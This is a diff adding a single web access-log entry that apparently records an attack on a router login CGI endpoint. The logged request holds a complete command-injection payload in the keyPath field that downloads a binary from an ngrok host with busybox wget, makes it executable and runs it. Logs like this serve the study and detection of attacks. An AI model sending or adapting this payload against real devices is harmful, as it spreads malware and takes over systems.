@@ -1,0 +1,1 @@
+181.117.123.34 - - [10/Apr/2020:02:58:09 +0300] "POST /cgi-bin/mainfunction.cgi?action=login&keyPath=%27%0A/bin/sh${IFS}-c${IFS}'cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}arm7;${IFS}busybox${IFS}wget${IFS}http://19ce033f.ngrok.io/arm7;${IFS}chmod${IFS}777${IFS}arm7;${IFS}./arm7'%0A%27&loginUser=a&loginPwd=a HTTP/1.1" 400 150 "-" "-" "-"
